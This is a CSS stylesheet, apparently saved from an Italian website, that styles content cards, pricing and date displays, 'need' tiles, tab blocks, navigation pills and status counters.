.need-scroller-slick-wrap li.need .need-btn span:hover {
    background-color: #ffec00;
}

.panel-cards .panel-link.panel-link-posinline .btn-card span {
    background-color: transparent;
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    border-radius: 0px;
    background-position: right center;
}

.panel-cards .panel-link.panel-link-posinline .btn-card span:hover {
    background-color: transparent;
}

.panel-cards-default .panel-link .btn-card span,
.panel-cards-opacity .panel-link .btn-card span,
.panel-cards-news .panel-link .btn-card span,
.panel-cards-media .panel-link .btn-card span,
.panel-cards-large .panel-link .btn-card span,
.panel-cards-xlarge .panel-link .btn-card span,
.panel-cards-medium .panel-link .btn-card span,
.panel-cards-bg .panel-link .btn-card span,
.panel-cards-bg-double .panel-link .btn-card span,
.panel-cards-edge .panel-link .btn-card span,
.panel-cards-category .panel-link .btn-card span {
    text-indent: -9999px;
    padding: 3px 20px 3px 20px;
    width: 38px;
}

.panel-cards-category .panel-link .btn-card span,
.panel-cards-category:hover .panel-link .btn-card span:hover{
   background: none;
   background-color: transparent;
}

.panel-cards-default-icon .panel-heading {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/card-title-bg.png*/ url();
    background-position: left top;
    background-repeat: no-repeat;
    background-size: 50px;
}

.panel-cards-category .panel-heading{
   border-bottom: 1px solid #ececec;
}

.panel-cards-default-icon .panel-heading .panel-heading-wrap {
    padding-left: 60px;
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/icone-default-on/ico-documento-generico.png*/ url();
    background-position: left 13px top 12px;
    background-repeat: no-repeat;
    background-size: 24px;
}

.panel-cards-default-icon .panel-heading h4 {
    display: table-cell;
    height: 50px;
    vertical-align: middle;
}


/*
.panel-cards-large .panel-wrap-pre {
    overflow: hidden;
}

.panel-cards-large .panel-wrap-pre img{
    transform: scale(1);
}
.panel-cards-large .panel-wrap-pre img:hover{
    transform: scale(1.1);
    transition: all 1s ease 0s;
}
*/

/* Mosaic content */

.content-mosaic .panel-cards-bg-double {
    height: 222px;
}

.content-mosaic .panel-cards-bg-double .panel-wrap {
    height: 177px;
    padding: 30px 30px 0 30px;
    overflow-y: auto;
}

.content-mosaic .panel-cards-bg-double .panel-wrap .panel-heading {
    min-height: auto;
}

.content-mosaic .panel-cards-default .panel-heading-subtitle {
    display: none;
}


/* Safari fix */

.panel-cards-default .panel-link .btn-card span:not(:root),
.panel-cards-opacity .panel-link .btn-card span:not(:root),
.panel-cards-news .panel-link .btn-card span:not(:root),
.panel-cards-media .panel-link .btn-card span:not(:root),
.panel-cards-large .panel-link .btn-card span:not(:root),
.panel-cards-xlarge .panel-link .btn-card span:not(:root),
.panel-cards-medium .panel-link .btn-card span:not(:root),
.panel-cards-bg .panel-link .btn-card span:not(:root),
.panel-cards-bg-double .panel-link .btn-card span:not(:root),
.need-scroller-slick-wrap .need .need-btn span:not(:root) {
    padding: 3px 0px;
    background-position-x: 70%;
    background-position-y: 47%;
}


/* Safari fix end*/

.panel-cards .panel-link-pos1 {
    position: absolute;
    bottom: 15px;
    right: 0px;
}

.panel-cards .panel-link-posinline {
    position: absolute;
    bottom: 0px;
    right: 0px;
    display: block;
    width: 100%;
    height: 100%;
}

.panel-cards .panel-link-posinline a {
    display: block;
    width: 100%;
    height: 100%;
}

.panel-cards .panel-link-posinline a span {
    float: right;
}

.panel-cards .panel-link-pos1 .btn-card-extra {
    position: absolute;
    top: -40px;
    margin: 0;
}

.panel-cards .panel-link-abs a {
    height: 100%;
    left: 0;
    margin: 0;
    position: absolute;
    top: 0;
    width: 100%;
    outline: none;
}

.panel-cards .panel-link-abs .btn-card span {
    position: absolute;
    bottom: 15px;
    right: 0;
}

.panel .panel-badge,
.panel-cards .panel-badge{
  position: absolute;
  top: 0px;
  right: 30px;
}
.panel .panel-badge-default span,
.panel-cards .panel-badge-default span{
  display: block;
  background-color: #eedc00;
  width: 26px;
  height: 40px;
  text-indent: -9999px;
}

.panel .panel-badge-default span::after,
.panel-cards .panel-badge-default span::after{
  display: block;
  background-color: #fff;
  content: "";
  position: absolute;
  bottom: 0px;
  /*width: 36px;
  height: 36px;
  -webkit-transform: rotate(45deg);
  -moz-transform: rotate(45deg);
  -ms-transform: rotate(45deg);
  -o-transform: rotate(45deg);
  transform: rotate(45deg);*/
  width: 0; height: 0; line-height: 0;
  border-bottom: 13px solid #fff;
  border-left: 13px solid #eedc00;
  border-right: 13px solid #eedc00;
}

.panel .panel-badge-star span,
.panel-cards .panel-badge-star span{
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/icone/ico-badge-star.png*/ url();
    background-position: top 7px center;
    background-repeat: no-repeat;
    background-size: 15px;
}




.panel-cards .panel-wrap .panel-heading {
    min-height: 60px;
    padding: 0 0 10px 0;
}

.panel-cards-bg-promo .panel-wrap .panel-heading,
.panel-cards-large .panel-wrap .panel-heading {
    min-height: 40px;
    padding: 0 0 10px 0;
}

.panel-cards-bg-promo .panel-wrap .panel-body{
    min-height: 120px;
}

.panel-cards-appointment .panel-wrap .panel-heading,
.panel-cards-boxed .panel-wrap .panel-heading,
.panel-cards-opacity .panel-wrap .panel-heading,
.panel-cards-ticket .panel-wrap .panel-heading,
.panel-cards-services .panel-wrap .panel-heading {
    min-height: 35px;
}

.panel-cards-cart .panel-wrap .panel-heading {
    min-height: auto;
    padding: 0;
}

.panel-cards .panel-wrap-pre .panel-heading {
    min-height: 15px;
    padding: 0;
}

.panel-cards-edge .panel-heading .panel-heading-title {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right.png*/ url();
    background-position: right bottom 6px;
    background-repeat: no-repeat;
    background-size: 9px 14px;
    padding: 0 15px 0 0;
}

.panel-cards-edge-simple .panel-heading .panel-heading-title {
    background-image: none;
}

.panel-cards .panel-heading .panel-heading-subtitle {
    text-transform: uppercase;
    color: #787878;
    font-size: 16px;
    padding-bottom: 3px;
    font-weight: 600;
}

.panel-cards-basic .panel-heading .panel-heading-subtitle,
.panel-cards-appointment .panel-heading .panel-heading-subtitle,
.panel-cards-boxed .panel-heading .panel-heading-subtitle,
.panel-cards-cart .panel-heading .panel-heading-subtitle {
    color: #222427;
    font-weight: 600;
}

.panel-cards-edge .panel-heading .panel-heading-subtitle {
    text-transform: none;
}

.panel-cards-basic .panel-heading .panel-heading-subtitle,
.panel-cards-appointment .panel-heading .panel-heading-subtitle {
    text-align: center;
}

.panel-cards-boxed .panel-heading .panel-heading-subtitle,
.panel-cards-cart .panel-heading .panel-heading-subtitle {
    text-align: left;
    padding-top: 10px;
    display: inline-block;
}

.panel-cards-large .panel-heading .panel-heading-subtitle,
.panel-cards-xlarge .panel-heading .panel-heading-subtitle,
.panel-cards-medium .panel-heading .panel-heading-subtitle {
    display: none;
}


/* panel cards title */

.panel-cards .panel-heading h4 {
    font-weight: bold;
    margin-top: 7px;
}

.panel-cards-edge .panel-heading .h3 {
    font-weight: bold;
    margin-top: 4px;
    margin-bottom: 0;
}

.panel-cards-services .panel-heading h3 {
    color: #222427;
    font-size: 36px;
    font-weight: 500;
    margin-top: 0px;
}

.panel-cards-large .panel-heading h4 {
    font-size: 26px;
    margin: 15px 0 5px;
}

.panel-cards-news .panel-heading h5,
.panel-cards-media .panel-heading h5 {
    font-weight: bold;
    font-size: 20px;
}

.panel-cards-xlarge .panel-heading h4 {
    font-weight: 500;
    font-size: 44px;
    margin: 30px 0 6px;
}

.panel-cards-ticket .panel-heading .h4,
.panel-cards-boxed .panel-heading .h4,
.panel-cards-appointment .panel-heading .h4 {
    font-weight: 500;
    display: block;
    margin-top: 10px;
    margin-bottom: 10px;
}

.panel-cards-cart .panel-heading .h4 {
    font-weight: 500;
    display: block;
    margin-top: 0px;
    margin-bottom: 0px;
}

.panel-cards-cart .panel-heading .light-text {
    font-weight: 100;
}

.panel-cards-basic .panel-heading h4,
.panel-cards-basic .panel-heading .h4 {
    font-weight: 200;
    margin-top: 7px;
    font-size: 24px;
    padding: 45px 0 0;
    text-align: center;
}

.panel-cards-bg .panel-heading h4,
.panel-cards-bg .panel-heading .h4 {
    color: #fff;
}

.panel-cards-opacity .panel-heading h4 {
    margin: 0;
}


/**/

.panel-cards-ticket .panel-heading .h4 img {
    width: 12px;
}

.panel-cards .panel-body {
    padding: 0;
}

.panel-cards .panel-body p {
    margin: 0;
    line-height: 22px;
}

.panel-cards-ticket .panel-body,
.panel-cards-appointment .panel-body,
.panel-cards-boxed .panel-body,
.panel-cards-cart .panel-body {
    padding: 0;
}

.panel-cards-category .panel-body{
   padding: 10px 0;
}

.panel-cards-ticket .panel-body p,
.panel-cards-appointment .panel-body p,
.panel-cards-boxed .panel-body p,
.panel-cards-cart .panel-body p,
.panel-cards-category .panel-body p {
    font-size: 16px;
    line-height: 20px;
    color: #787878;
}

.panel-cards.panel-cards-bg-double,
.panel-cards.panel-cards-bg-full {
    background-position: top left;
    background-repeat: no-repeat;
    background-size: auto;
}

.panel-cards.panel-cards-large,
.panel-cards.panel-cards-xlarge {
    background-position: top center;
    background-repeat: no-repeat;
    background-size: auto;
}

.panel-cards.panel-cards-bg .panel-wrap-pre {
    background-position: top center;
    background-repeat: no-repeat;
    background-size: auto;
}

.panel-cards.panel-cards-bg-promo .panel-wrap .panel-heading h4 {
    font-size: 26px;
    margin: 5px 0 5px;
}

.panel-cards.panel-cards-bg-promo .panel-wrap-pre {
    background-position: top center;
    background-repeat: no-repeat;
    background-size: 100%;
}

.panel-cards.panel-cards-bg-promo.promo-top .panel-wrap-pre {
    background-position: top center;
}

.panel-cards.panel-cards-bg-promo.promo-bottom .panel-wrap-pre {
    background-position: bottom center;
}


.panel-cards.panel-cards-bg-promo .panel-wrap-pre .panel-heading {
    min-height: 320px;
}

.panel-cards.cards-dark .panel-heading,
.panel-cards.cards-dark .panel-heading h3,
.panel-cards.cards-dark .panel-heading h4 {
    color: #fff;
}

.panel-cards.cards-dark .panel-body p {
    color: inherit;
}

.panel-cards-bg-full.cards-dark .panel-body p,
.panel-cards-bg-full.cards-dark .panel-body p a {
    color: #fff;
}

.panel-cards.cards-light .panel-heading,
.panel-cards.cards-light .panel-heading h3,
.panel-cards.cards-light .panel-heading h4 {
    color: #222427;
}

.panel-cards.cards-light .panel-body p {
    color: inherit;
}

.panel-cards-bg-full.cards-light .panel-body p,
.panel-cards-bg-full.cards-light .panel-body p a {
    color: #222427;
}

.panel-cards:hover {
    -webkit-transition: box-shadow 0.3s linear;
    -o-transition: box-shadow 0.3s linear;
    -moz-transition: box-shadow 0.3s linear;
    -ms-transition: box-shadow 0.3s linear;
    -kthtml-transition: box-shadow 0.3s linear;
    transition: box-shadow 0.3s linear;
    -webkit-box-shadow: 0px 0px 10px 0 rgba(0, 0, 0, 0.1);
    -moz-box-shadow: 0px 0px 10px 0 rgba(0, 0, 0, 0.1);
    box-shadow: 0px 0px 10px 0 rgba(0, 0, 0, 0.1);
}


/* Detailed Cards */

.panel-detailed-cards,
.panel-detailed-cards-bg {
    border: 1px solid #ececec;
    position: relative;
}

.panel-detailed-cards .panel-wrap,
.panel-detailed-cards-bg .panel-wrap {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/rounded-right-bg.png*/ url();
    background-position: top right;
    background-repeat: no-repeat;
}


/*
.panel-detailed-cards-simple .panel-wrap:before{
    background-image: url(/risorse_dt/condivise/immagini/generiche/rounded-right-bg.png);
    background-position: top right;
    background-repeat: no-repeat;
    content: "";
    position: absolute;
    width: 100%;
    height: 100%;
    top: 0%;
    left: 0%;
    z-index: 0;
    -webkit-transform: rotate(-180deg);
    -moz-transform: rotate(-180deg);
    -ms-transform: rotate(-180deg);
    -o-transform: rotate(-180deg);
    transform: rotate(-180deg);
}
*/

.panel-detailed-cards .panel-wrap,
.panel-detailed-cards-bg .panel-wrap {
    padding: 40px 20px 40px 40px;
}

.panel-detailed-cards-bg .panel-wrap {
    min-height: 220px;
}

.panel-detailed-cards .advantage-detail,
.panel-detailed-cards-bg .advantage-detail {
    border-bottom: none;
    min-height: 120px;
}

.panel-detailed-cards-simple .advantage-detail {
    min-height: 80px;
}

.panel-detailed-cards .advantage-detail-spec,
.panel-detailed-cards-bg .advantage-detail-spec {
    padding-left: 5px;
}

.panel-detailed-cards .panel-body,
.panel-detailed-cards-bg .panel-body {
    padding: 0px;
}

.panel-detailed-cards h4,
.panel-detailed-cards-bg h4 {
    margin-top: 0;
    margin-bottom: 20px;
}

.panel-detailed-cards h4 {
    color: #0047bb;
}

.panel-detailed-cards-bg h4 {
    color: #222427;
    font-weight: 500;
}

.panel-detailed-cards .btn,
.panel-detailed-cards-bg .btn {
    margin: 40px 0 0;
}

.panel-cards-basic .panel-link .btn-card span,
.panel-detailed-cards .panel-link .btn-card span,
.panel-detailed-cards-bg .panel-link .btn-card span {
    padding: 4px 34px 4px 20px;
}

.panel-detailed-cards .price-info,
.panel-detailed-cards-bg .price-info,
.panel-detailed-cards .price-subinfo,
.panel-detailed-cards-bg .price-subinfo {
    padding-top: 0;
    margin-bottom: 5px;
    color: #4a4a4a;
}

.panel-detailed-cards .price-info,
.panel-detailed-cards .price-subinfo {
    font-size: 15px;
}

.panel-detailed-cards .price-info {
    text-align: left;
}

.panel-detailed-cards .price-subinfo {
    text-align: right;
}

.panel-detailed-cards-bg .price-info,
.panel-detailed-cards-bg .price-subinfo {
    font-size: 18px;
}

.panel-detailed-cards-bg .price-info {
    text-align: left;
}

.panel-detailed-cards-bg .price-subinfo {
    text-align: right;
}

.panel-detailed-cards-bg p.price-subinfo,
.panel-detailed-cards p.price-subinfo {
    margin-top: 5px;
    clear: both;
}

.panel-detailed-cards .panel-link.panel-link-pos1 a:hover,
.panel-detailed-cards-bg .panel-link.panel-link-pos1 a:hover {
    background-color: #ffec00;
    text-decoration: none;
}

.panel-detailed-cards .panel-link-pos1,
.panel-detailed-cards-bg .panel-link-pos1,
.panel-detailed-cards .panel-link-abs,
.panel-detailed-cards-bg .panel-link-abs {
    bottom: 15px;
}

.panel-cards-edge .panel-link-abs .btn-card span {
    background: none;
    background-color: transparent;
}

.panel-detailed-cards .panel-link-pos2,
.panel-detailed-cards-bg .panel-link-pos2 {
    float: right;
    margin-top: 22px;
}

.panel-detailed-cards-bg {
    background-position: top 92px left 42px;
    background-repeat: no-repeat;
}

.panel-cards-default .cards-detail,
.panel-cards-default .cards-info,
.panel-cards-default .cards-subinfo {
    display: block;
    width: 100%;
    font-weight: 400;
}

.panel-cards-default .cards-info,
.panel-cards-default .cards-subinfo {
    font-size: 15px;
}

.panel-cards-default .cards-detail {
    font-size: 26px;
}

.panel-cards-category .cards-detail {
   display: block;
   width: 100%;
   font-weight: 600;
   font-size: 18px;
}

/* Level */

.panel-detailed-cards .level-spec,
.panel-detailed-cards-bg .level-spec {
    display: table-cell;
    vertical-align: middle;
    height: 70px;
    font-size: 30px;
    font-weight: 400;
    line-height: normal !important;
    padding: 5px 0 15px 0;
}

.panel-detailed-cards .level-info,
.panel-detailed-cards-bg .level-info {
    font-size: 16px;
    line-height: 20px;
}


/**/

.abstract-advantage .panel-detailed-cards .panel-body {
    padding: 0px;
    min-height: 100px;
}

.abstract-advantage .panel-detailed-cards-simple .panel-body {
    min-height: auto;
}

.abstract-advantage .panel-detailed-cards .panel-body h4 {
    display: none;
}

.abstract-advantage .panel-detailed-cards .price-info {
    margin-bottom: 0;
}

.abstract-advantage .panel-detailed-cards .price-currency {
    font-size: 22px;
}

.abstract-advantage .panel-detailed-cards .price-value {
    font-size: 56px;
}

.abstract-advantage .panel-detailed-cards .price-subvalue {
    font-size: 22px;
}

.abstract-advantage .panel-detailed-cards .panel-link-pos1 {
    bottom: 15px;
}

.abstract-advantage .advantage-detail-spec .level-info {
    font-size: 16px;
}

.abstract-advantage .advantage-detail-spec .level-spec {
    font-size: 23px;
    font-weight: 400;
    line-height: normal !important;
    padding: 0 0 15px 0;
    display: block;
    height: auto;
}

.abstract-advantage .advantage-detail-spec .level-range li span {
    width: 12px;
    font-size: 13px;
}

.abstract-advantage .advantage-detail-spec .level-range li.active span {
    width: 16px;
}

/* Nav Pills*/
.panel-cards.panel-cards-boxed-nav:hover {
  box-shadow: none;
}
.panel-cards.panel-cards-boxed-nav .panel-heading .panel-heading-subtitle a{
  font-weight: bold!important;
}

.nav-pills > li,
.nav-pills > li  ul  li {
  margin: 0!important;
  position: relative;
}

.nav-pills > li .nav-element{
  display: block;
  padding: 13px 26px;
  background-color: #fff;
  border-left: 4px solid transparent;
  -webkit-border-radius: 0px;
  -moz-border-radius: 0px;
  border-radius: 0px;
  width: 100%;
  text-overflow: ellipsis;
  white-space: nowrap;
  overflow: hidden;
  font-weight: 400 !important;
  color: #575757;
}
.nav-pills > li > .nav-element{
    background-color: #fff;
}

.nav-pills > li > .nav-element:hover{
  border-left-color:  rgba(0, 0, 0, .15);
  background-color: transparent;
}

.nav-pills > li.active > .nav-element{
  border-left-color:  #0047bb;
  background-color: #fff;
  color: #222427;
}

.nav-pills > li.active > .nav-element:hover{
  background-color: transparent;
  color: #222427;
}

.nav-pills > li ul {
  padding: 0;
}

.nav-pills > li  ul  li{
  list-style: none;
}

.nav-pills > li ul li .nav-element{
    background-color: #ececec;
}
.nav-pills > li ul li .nav-element:hover{
    color: rgba(0, 0, 0, .5);
}







/* Pricing */

.price-info {
    color: #d0d0d0;
    padding-top: 0px;
}

.price-detail {
    display: table-row;
    float: right;
}

.price-detail .price-sign,
.price-detail .price-currency,
.price-detail .price-value,
.price-detail .price-subvalue {
    display: table-cell;
    font-weight: 200;
}

.price-detail .price-sign {
    font-size: 20px;
    vertical-align: middle;
}

.price-detail .price-currency {
    font-size: 23px;
    line-height: 29px;
    vertical-align: bottom;
}

.price-detail .price-value {
    font-size: 60px;
    line-height: 56px;
    vertical-align: top;
}

.price-detail .price-subvalue {
    /*
    font-size: 30px;
    line-height: 30px;
    */
    font-size: 26px;
    line-height: 38px;
    vertical-align: top;
    padding: 0 !important;
}

.price-detail .price-subvalue.price-subvalue-maxi {
    font-size: 26px;
    line-height: 26px;
    display: block;
    text-align: right;
}

.price-detail-xs,
.price-detail-sm {
    margin: 0;
}

.price-detail-xs .price-currency {
    font-size: 16px;
    line-height: 26px;
    vertical-align: bottom;
}

.price-detail-xs .price-value {
    font-size: 26px;
    line-height: 32px;
    font-weight: 400;
}

.price-detail-xs .price-subvalue {
    font-size: 16px;
    line-height: 26px;
    vertical-align: bottom;
}

.price-detail-sm .price-currency {
    font-size: 26px;
    line-height: 20px;
    vertical-align: bottom;
}

.price-detail-sm .price-value {
    font-size: 46px;
    line-height: 32px;
    font-weight: 100;
}

.price-detail-sm .price-subvalue {
    font-size: 26px;
    line-height: 20px;
    vertical-align: bottom;
}

.panel-detailed-cards-bg .price-detail,
.panel-detailed-cards-bg .price-info {
    margin-top: 10px !important;
}

.panel-detailed-cards-bg .price-detail {
    float: right;
}

.panel-detailed-cards-bg .price-detail span {
    padding-right: 4px;
}

.panel-detailed-cards-bg .price-detail .price-currency {
    font-size: 30px;
    line-height: 28px;
}

.panel-detailed-cards-bg .price-detail .price-value {
    font-size: 70px;
}

.panel-detailed-cards-bg .price-detail .price-subvalue {
    font-size: 36px;
}


/* Date */

.date-detail {
    margin: 0;
}

.date-detail span {
    display: block;
    text-align: center;
}

.date-detail .date-day {
    font-size: 26px;
    line-height: 22px;
    font-weight: 600;
}

.date-detail .date-month {
    font-size: 22px;
    line-height: 26px;
    text-transform: uppercase;
}

.date-detail .date-year {
    font-size: 16px;
    line-height: 16px;
}


/***************************/

/******* Bisogni *******/

/***************************/

.need-area {
    padding: 0;
    width: 1374px;
}

.need .need-btn span {
    display: block;
    background-color: #eedc00;
    color: #222427;
    font-size: 14px;
    font-weight: bold;
    line-height: 24px;
    padding: 3px 26px 3px 20px;
    text-transform: uppercase;
    line-height: 24px;
    -webkit-border-radius: 15px 0 0 15px;
    -moz-border-radius: 15px 0 0 15px;
    border-radius: 15px 0 0 15px;
    background-image: url(/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right.png);
    background-position: right 15px center;
    background-repeat: no-repeat;
    background-size: 9px 14px;
    outline: none;
    position: absolute;
    text-indent: -9999px;
    right: 0;
    bottom: 15px;
    z-index: 3;
    opacity: 0;
}

.need-area li.need {
    white-space: normal;
    display: block;
    float: left;
    width: 204px;
    height: 204px;
    border: 1px solid #d0d0d0;
    background-color: #fff;
    margin: 0 14px;
    background-position: center;
    background-repeat: no-repeat;
    background-size: 204px;
}

.need-area li.need:first-child {
    margin-left: 0;
}

.need-area li.need:last-child {
    margin-right: 0;
}

.need-area li.need a {
    display: table-cell;
    vertical-align: middle;
    height: 204px;
    width: 204px;
    padding: 30px;
    position: relative;
}

.need-area li.need a span.need-overlay {
    -webkit-transition: opacity 0.3s linear;
    -o-transition: opacity 0.3s linear;
    -moz-transition: opacity 0.3s linear;
    -ms-transition: opacity 0.3s linear;
    -kthtml-transition: opacity 0.3s linear;
    transition: opacity 0.3s linear;
    opacity: 0;
    display: block;
    width: 100%;
    height: 240px;
    position: absolute;
    background-color: #0047bb;
    top: 0;
    left: 0;
}

.need-area li.need a:hover {
    text-decoration: none;
}

.need-area li.need a:hover span.need-overlay,
.need-area li.need a:hover .need-btn span {
    -webkit-transition: opacity 0.3s linear;
    -o-transition: opacity 0.3s linear;
    -moz-transition: opacity 0.3s linear;
    -ms-transition: opacity 0.3s linear;
    -kthtml-transition: opacity 0.3s linear;
    transition: opacity 0.3s linear;
}

.need-area li.need a:hover span.need-overlay {
    opacity: 0.6;
}

.need-area li.need a:hover .need-btn span {
    opacity: 1;
}

.need-area li.need a span.need-content,
.need-area li.need a span.need-ico {
    font-weight: 500;
    color: #fff;
    font-size: 28px;
    text-align: center;
    display: block;
    position: absolute;
    z-index: 2;
    left: 0;
    right: 0;
}

.need-area li.need a span.need-content {
    top: 80px;
    padding: 0 10px;
}

.need-area li.need a span.need-ico {
    top: 30px;
}

.need-area li.need a span.need-ico img {
    max-width: 42px;
    margin: 0 auto;
}

.need-area .slick-list.draggable:hover {
    cursor: grab;
}

.need-area .slick-list.draggable:active {
    cursor: grabbing;
}


/*** bisogni scroller ***/

.need-scroller-slick-wrap {
    text-align: center;
}

.need-scroller-slick.need-area {
    width: 100%;
}

.need-scroller-slick-wrap li.need .need-btn span {
    display: block;
    background-color: #eedc00;
    color: #222427;
    font-size: 14px;
    font-weight: bold;
    line-height: 24px;
    padding: 3px 20px 3px 20px;
    text-transform: uppercase;
    line-height: 24px;
    -webkit-border-radius: 15px 0 0 15px;
    -moz-border-radius: 15px 0 0 15px;
    border-radius: 15px 0 0 15px;
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right.png*/ url();
    background-position: right 13px center;
    background-repeat: no-repeat;
    background-size: 9px 14px;
    outline: none;
}

.need-scroller-slick.need-area li.need {
    width: auto;
}

.need-scroller-slick .slick-slide img {
    display: initial;
}

.need-scroller-slick .slick-controls,
.need-scroller-slick .slick-controls * {
    position: absolute;
    left: -99999px;
}

.need-scroller-slick-prev,
.need-scroller-slick-next {
    font-size: 30px;
    height: 200px;
}

.need-scroller-slick-prev span,
.need-scroller-slick-next span {
    top: 75px;
}

.need-scroller-slick-prev:hover,
.need-scroller-slick-next:hover {
    cursor: pointer;
}

.need-scroller-slick .slick-dots {
    width: auto;
    left: 0;
    right: 0;
}


/***************************/

/******* Blocktab (es. subhome-pvita)  *******/

/***************************/

.blocktab-container ul {
    padding: 0;
    margin-bottom: 30px;
}

.blocktab-container ul li {
    display: block;
    float: left;
    width: 172px;
    height: 130px;
    margin: 0 15px;
    background-color: #fff;
    list-style: none;
    border: 1px solid #ececec;
}

.nobracket .blocktab-container ul li {
    width: 204px;
    height: 130px;
    margin: 0 15px;
}

.blocktab-container ul li.active {
    background-color: #0047bb;
}

.blocktab-container ul li:first-child {
    margin-left: 0 !important;
}

.blocktab-container ul li:last-child {
    margin-right: 0 !important;
}

.blocktab-container ul li a {
    display: block;
    width: 100%;
    height: 100%;
}

.blocktab-container ul li:hover {
    border: 1px solid #adadad;
}

.blocktab-container ul li:hover a {
    text-decoration: none !important;
}

.blocktab-container ul li a:focus {
    outline: none;
}

.blocktab-container ul li a span.blocktab-maininfo {
    display: table-cell;
    width: 172px;
    height: 90px;
    vertical-align: middle;
    text-transform: uppercase;
    color: #4a4a4a;
    padding: 25px 15px 20px;
}

.nobracket .blocktab-container ul li a span.blocktab-maininfo {
    width: 204px;
}

.blocktab-container ul li a span.blocktab-detail {
    display: block;
    color: #0047bb;
    font-size: 16px;
}

.blocktab-container ul li a span {
    text-align: center;
    font-size: 15px;
}

.blocktab-container ul li.active a {
    position: relative;
}

.blocktab-container ul li.active a span {
    color: #fff;
    text-align: center;
    font-size: 15px;
}

.blocktab-container ul li.active a:after {
    display: block;
    width: 18px;
    height: 18px;
    content: "";
    background-color: #0047bb;
    transform: rotate(45deg);
    -ms-transform: rotate(45deg);
    -moz-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    -o-transform: rotate(45deg);
    position: absolute;
    left: 0;
    right: 0;
    margin: auto;
    bottom: -6px;
}

/* con spalla - default */

.blocktab-container ul.blocktab-5 li,
.blocktab-container ul.blocktab-5 li a span.blocktab-maininfo {
    width: 131px;
}

/* gestione parole troppo lunghe sui tab */

.blocktab-reduced-font .blocktab-container ul.blocktab-5 li a span.blocktab-maininfo {
    font-size: 13px !important;
    padding-left: 10px !important;
    padding-right: 10px !important;
}

/* senza spalla */

.nobracket .blocktab-container ul.blocktab-5 li,
.nobracket .blocktab-container ul.blocktab-5 li a span.blocktab-maininfo {
    width: 204px;
}

.nobracket .blocktab-container ul.blocktab-6 li,
.nobracket .blocktab-container ul.blocktab-6 li a span.blocktab-maininfo {
    width: 165px;
}

.nobracket .blocktab-container ul.blocktab-7 li,
.nobracket .blocktab-container ul.blocktab-7 li a span.blocktab-maininfo {
    width: 137px;
}

.blocktab-container.blocktab-container-small ul li {
    height: 95px;
}


/*.blocktab-container.blocktab-container-small ul li {
    height: 95px;
}*/

.blocktab-container.blocktab-container-small ul li .blocktab-detail {
    display: none;
}

.content-blocktab .list-check p.like-title {
    margin-bottom: 5px;
    font-weight: bold;
    font-size: 19px;
    color: #222427;
}

.content-blocktab .list-check p {
    margin: 0;
}

.content-blocktab .list-check li {
    margin-bottom: 15px;
}

.content-blocktab .box-grey h5 {
    font-size: 24px;
    font-weight: 500;
    margin: 0 0 20px 0;
}


/***************************/

/******* Gestione Applicazioni *******/

/***************************/

.wrap-application-nav ul.application-nav {
    margin: 0;
}

.wrap-application-nav ul.application-nav li {
    margin-right: 18px;
    text-transform: uppercase;
}

.wrap-application-nav ul.application-nav li a {
    border-bottom: 3px solid transparent;
    color: #222427;
    display: block;
    min-height: 45px;
    font-weight: bold;
}

.wrap-application-nav ul.application-nav li a:hover {
    text-decoration: none;
    border-bottom: 3px solid #0047bb;
    color: #0047bb;
}

.wrap-application-nav ul.application-nav li a.active {
    border-bottom: 3px solid #0047bb;
    color: #0047bb;
}

.wrap-application-nav ul.application-nav li:last-child {
    margin-right: 0px;
}

.counter,
.tag_info {
    background-color: #ececec;
    border-radius: 30px;
    color: #787878;
    display: inline;
    font-size: 14px;
    margin-left: 5px;
    padding: 2px 10px;
    font-weight: 600;
}

.counter-blue,
.tag_info-blue {
    background-color: #0047bb;
    color: #fff;
}

.counter.text-error,
.tag_info.text-error {
    background-color: #ffe5e5;
}

.counter.text-warning,
.tag_info.text-warning {
    background-color: #fef6ea;
}

.counter.text-info,
.tag_info.text-info {
    background-color: #ececec;
}

.counter.text-success,
.tag_info.text-success {
    background-color: #e9f7ee;
}

.counter.text-basic,
.tag_info.text-basic {
    background-color: #e5ecf7;
}

.counter.text-deleted,
.tag_info.text-deleted {
    background-color: #ececec;
}

.tag_info {
    margin-left: 0;
}

.filter-limit,
.level-range {
    padding: 0;
    display: inline-block;
}

.level-range {
    margin-top: 5px;
    margin-bottom: 10px;
}

.filter-limit {
    margin-top: 10px;
    margin-bottom: 10px;
}

.filter-limit li {
    margin-left: 5px;
    display: inline-block;
}

.level-range li {
    margin-left: 0px;
    display: inline-block;
}

.filter-limit li:first-child,
.level-range li:first-child {
    margin-left: 0px;
}

.level-range li {
    margin-bottom: 5px;
}

.filter-limit li span,
.level-range li span {
    border-radius: 30px;
}

.filter-limit li span {
    background-color: #ececec;
    display: block;
    padding: 0px 15px;
    font-weight: 500;
    font-size: 16px;
}

.level-range li span {
    background-color: transparent;
    line-height: 14px;
    padding: 2px;
    text-align: center;
    width: 14px;
    font-size: 14px;
}

.filter-limit li span,
.filter-limit li span a,
.level-range li span,
.level-range li span a {
    color: #222427;
    display: block;
}

.level-range li span a:hover {
    cursor: pointer;
}

.filter-limit li.active span,
.level-range li.active span {
    background-color: #eedc00;
}

.level-range li.active span {
    width: 18px;
    margin-left: -2px;
    margin-right: -2px;
}

.filter-limit li.active span,
.filter-limit li.active span a,
.level-range li.active span,
.level-range li.active span a {
    color: #222427;
}


/* Panel - Pills */

.panel-group-pills .panel {
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    border-radius: 0px;
}

.panel-group-pills .panel {
    margin-bottom: 20px;
}

.panel-pills {
    border-width: 1px;
    border-color: #ececec;
    border-style: solid;
}

.panel-pills .panel-heading {
    padding: 25px 40px 25px 40px;
}

.panel-pills .panel-heading .panel-raise{
    color: #0047bb;
}

.panel-pills .panel-heading .panel-title {
    font-size: 26px;
}

.panel-pills .panel-body {
    border-top: 1px solid #ececec !important;
    padding: 25px 40px 25px 40px;
}

.panel-pills .pills-wrap {
    position: relative;
}

.panel-pills .pills-wrap .pills-abs {
    position: absolute;
    margin: 0;
    top: 50%;
    transform: translateY(-50%);
}

.panel-pills .pills-wrap .pills-abs-left {
    left: 0px;
}

